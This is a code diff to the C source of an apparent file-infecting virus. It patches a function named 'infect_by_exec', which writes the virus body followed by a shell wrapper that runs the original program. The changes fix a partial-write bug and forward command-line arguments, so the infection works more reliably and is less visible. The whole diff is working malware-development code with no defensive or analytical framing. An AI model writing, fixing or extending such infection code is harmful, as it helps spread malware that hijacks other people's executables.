@@ -91,14 +91,14 @@ int writev_all(int fd, struct iovec *iov, int remaining) {
     while (remaining > 0) {
         ssize_t result = writev(fd, iov, remaining);
         if (result < 0) break;
-        for (int i = 0; i < remaining; ++i) {
-            size_t *iov_len = &iov->iov_len;
-            if ((size_t) result >= *iov_len) {
-                result -= *iov_len;
+        while (remaining > 0) {
+            if ((size_t) result >= iov->iov_len) {
+                result -= iov->iov_len;
                 ++iov;
                 --remaining;
             } else {
-                *iov_len -= result;
+                iov->iov_base = result + (char *) iov->iov_base;
+                iov->iov_len -= result;
                 break;
             }
         }
@@ -172,7 +172,6 @@ int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
         result = errno;
         goto exit;
     }
-    link[length] = '\n';
 
     char tmp_name[] = "XXXXXX";
     int tmp_fd = mkstemp(tmp_name);
@@ -188,18 +187,23 @@ int infect_by_exec(const char *virus, size_t virus_size, const char *path) {
     }
 
     static const char script_header[] = "#!/bin/sh\nexec ";
+    static const char script_footer[] = " $@\n";
 
-    result = posix_fallocate(tmp_fd, 0, virus_size + sizeof(script_header) + length);
+    result = posix_fallocate(
+        tmp_fd,
+        0,
+        virus_size + (sizeof(script_header) - 1) + length + (sizeof(script_footer) - 1));
     if (result) {
         goto close_tmp;
     }
     posix_fadvise(tmp_fd, 0, 0, POSIX_FADV_SEQUENTIAL);
 
-    enum { count = 3 };
+    enum { count = 4 };
     struct iovec iov[count] = {
         {(void *) virus, virus_size},
         {(void *) script_header, sizeof(script_header) - 1},
-        {link, length + 1}
+        {link, length},
+        {(void *) script_footer, sizeof(script_footer) - 1},
     };
     if (writev_all(tmp_fd, iov, count) > 0) {
         result = errno;
